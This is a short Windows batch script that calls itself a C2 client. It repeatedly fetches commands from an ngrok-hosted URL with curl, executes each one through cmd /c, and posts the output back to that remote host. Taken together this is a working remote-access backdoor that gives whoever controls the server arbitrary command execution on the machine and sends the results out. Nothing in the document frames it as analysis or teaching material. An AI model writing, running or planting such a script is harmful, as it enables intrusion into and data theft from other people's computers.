@echo off
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev

echo [*] Starting C2 Client
echo [*] URL: %URL%

:loop
    echo [*] Requesting command...
    
    rem Get command from server
    for /f "usebackq delims=" %%A in (`curl -s %URL% 2^>nul`) do set CMD=%%A
    
    if "%CMD%"=="" (
        echo [*] No command available, waiting...
        timeout /t 2 /nobreak >nul
        goto loop
    )
    
    echo [*] Executing: %CMD%
    
    rem Execute command
    set TEMPFILE=%TEMP%\c2_output.txt
    cmd /c "%CMD%" > "%TEMPFILE%" 2>&1
    
    rem Send output back
    if exist "%TEMPFILE%" (
        echo [*] Sending output...
        for /f "usebackq delims=" %%O in ("%TEMPFILE%") do (
            curl -X POST -d "%%O" %URL% 2>nul
        )
        del "%TEMPFILE%" 2>nul
    ) else (
        curl -X POST -d "[+] Command executed with no output" %URL% 2>nul
    )
    
    rem Wait before requesting next command
    timeout /t 1 /nobreak >nul
    
    goto loop
